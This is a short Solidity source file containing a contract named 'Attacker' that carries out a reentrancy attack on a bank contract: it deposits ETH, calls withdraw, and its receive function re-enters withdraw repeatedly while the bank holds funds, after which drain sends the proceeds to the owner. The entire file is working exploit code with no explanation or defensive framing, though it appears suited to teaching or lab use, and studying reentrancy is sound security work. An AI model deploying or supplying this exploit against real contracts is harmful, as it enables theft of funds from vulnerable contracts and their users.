// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

interface IBank {
    function deposit() external payable;

    function withdraw() external;
}

contract Attacker {
    IBank public bank;
    address public owner;

    constructor(address bankAddress) {
        bank = IBank(bankAddress);
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.value > 0, "Need ETH to seed");
        bank.deposit{value: msg.value}();
        bank.withdraw();
    }

    function drain() external {
        require(msg.sender == owner, "Not owner");
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {
        if (address(bank).balance >= msg.value) {
            bank.withdraw();
        }
    }
}
